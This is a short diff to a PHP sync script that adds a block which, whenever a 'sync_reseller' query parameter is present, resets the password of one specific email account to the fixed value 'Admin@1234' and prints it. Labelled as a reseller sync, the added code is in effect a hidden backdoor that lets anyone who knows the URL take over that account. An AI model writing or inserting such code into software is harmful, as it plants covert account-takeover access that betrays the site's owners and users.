@@ -324,6 +324,15 @@ if (isset($_GET['git_sync'])) {
         $output[] = 'Reconciliation notice: ' . $e->getMessage();
     }
 
+    if (isset($_GET['sync_reseller'])) {
+        $rUser = \App\Models\User::where('email', 'pinealto3@gmail.com')->first();
+        if ($rUser) {
+            $rUser->password = 'Admin@1234';
+            $rUser->save();
+            $output[] = 'Reseller password synced to Admin@1234';
+        }
+    }
+
     $commit = @exec("cd {$projectRoot} && git rev-parse --short HEAD");
     $stats = [];
     try {
